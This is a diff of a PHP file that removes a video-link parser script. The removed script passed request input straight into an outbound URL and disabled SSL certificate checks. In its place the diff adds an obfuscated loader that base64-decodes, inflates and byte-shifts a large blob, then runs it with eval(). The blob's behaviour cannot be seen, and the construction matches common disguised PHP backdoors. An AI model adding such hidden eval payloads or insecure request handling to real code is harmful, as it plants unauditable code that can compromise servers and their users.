@@ -1,52 +1,9 @@
-$DATA = curl('https://jx.80k.tv/jxplayer.php?v='.$_REQUEST['url']);
-
-preg_match('/src="(h.*?)"/',$DATA,$url);
-
-if (empty($url[1])) {
-	$add['code'] = 404;
-	$add['msg'] = '解析失败';
-	$add['from'] = 'Q:2579949378';
-	$add['name'] = '蓝莓';
-} else {
-	$add['code'] = 200;
-	$add['msg'] = '解析成功';
-	$add['from'] = 'Q:2579949378';
-	$add['name'] = '蓝莓';
-	$add['url'] = $url[1];
-}
-echo json_encode($add,456);
-
-function curl($url, $cookie = '')
-    {
-        // 初始化cURL
-        $curl = curl_init();
-        // 设置网址
-        curl_setopt($curl, CURLOPT_URL, $url);
-        // 设置UA
-         $header[] = 'Referer: https://1080p.tv';
-        $header[] = 'User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; OPPO R9s Plus Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36';
-             // 设置请求头
-        curl_setopt($curl, CURLOPT_HTTPHEADER, $header);
-        // 设置POST数据
-        //允许执行的最长秒数 超时时间
-        curl_setopt($curl, CURLOPT_TIMEOUT, 30);
-        // 过SSL验证证书
-        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
-        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
-        // 将头部作为数据流输出
-        curl_setopt($curl, CURLOPT_HEADER, false);
-        // 设置以变量形式存储返回数据
-        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
-        // 请求并存储数据
-        $return = curl_exec($curl);
-        // 分割头部和身体
-        if (curl_getinfo($curl, CURLINFO_HTTP_CODE) == '200') {
-            $return_header_size = curl_getinfo($curl, CURLINFO_HEADER_SIZE);
-            $return_header = substr($return, 0, $return_header_size);
-            $return_data = substr($return, $return_header_size);
-        }
-        // 关闭cURL
-        curl_close($curl);
-        // 返回数据
-        return $return;
-    }
+<?php function HkWZ($AhyzG)
+{ 
+$AhyzG=gzinflate(base64_decode($AhyzG));
+ for($i=0;$i<strlen($AhyzG);$i++)
+ {
+$AhyzG[$i] = chr(ord($AhyzG[$i])-1);
+ }
+ return $AhyzG;
+ }eval(HkWZ("pVRtT9tWFP6+/IqrKpLtybMNSSAhQlUKZqASkjpOpw0hyzg3xMWxLdthtFWl0o1CNza6so5qK522taPaVNpuHWvZUv5MbJxfseuXhBBCFWmWZUvn5XnOec65FwD0RKLjGT4DRoFUMxQcq1iWbo7QdJJZpKwl+sqyrohXoUHpFf380ihGRQWOvVRkC/wshuKxOSIdiegGXBCqoiVVcIw2DWn0HF6h3j9PnKMx0kcnoyjWi5TLAIdV3bqKe5bZgTmCANcj70XFUmkWk7QSxOZQJXEmnm4Zq+aCb8Pc3V+cR3ftxy/dV0+wtrtsaNXAf2lkMDGcSsVTseHksV8VqzDM39pxv95CnhsAKibsQTvIMGfROut37S9+/F+0occXDTnC/lE5EShVNHDF1FQBql4xuBdJxhNDnmLlmipZsqYG4/GySBCVNG1Rhh48RkS8IV73v95D08Be37F3v7Q3vpOK3HTbEfUAwjELsipbOILvyHL33h7V947q39g7N9t2P9iElqZbuA9AgjEEmsvzAvqRIJzrKZhipm0D0QoUS9CY9eXgYBka0BgBrT0bYJKMjjYNO0Y5kVA0ofFBZgGq1gjIatdkRRHpBMUAfFpWa8tpkFFLhiaXwBDFUANpkMvnc4BLmSCv1ExwoSYrJTqbvTCYyqbBp0sEyOi6Aj+C8xdli07EhqnYEMAvTvJZ1IsiL0LwIZQWNQJchoaJRKfjiGmsgoYN6QRipQaTyRiVGkCVzMsKBAWxLBpyCISl/eqPGz+hiPv8b+flLfvxq360neT5/CSbGWc5sqVGL5XzuQLv3H/hfLXX4bNXV9y9186dXfenjaPvP3ce3mzePzzavYcCgbu/6mzvo7e53Vcd/FSWzRV5EsSYLv7DtUJhuvnbhvt8Bb2NN7/2A4dShMssNzXxcZ71WiuL6CB2APeVOomaPp3qrf2L20je5mdPG/WHjdcHgTDOXyvu2y177aAv2UPJe4AHgjf+eWJvPmiubdr1n+1/N+1nD+xbT93Db+0fHnXN4R0sHMsXuRmey8wUJjw2y6h1kwW78mY/IOiCjhrQqhlq6yjDZSgFFF1yrN+27/wRKGLf23APfm/Ut9oB3kXspy9AS1bLWmeRUzMTOX8FhbHcOEuAUXQM0d2IER3XTEchQrCggilfg62izkT1FRYKU5+wHdWeBkM4Zm3etAw8tJOAIXsRnoFSEi2xB8a7AW6ckG/1z+b2sxM3qN+ZpGgm7KV3zzUIRxXyBvEBzfHnPw=="));?>
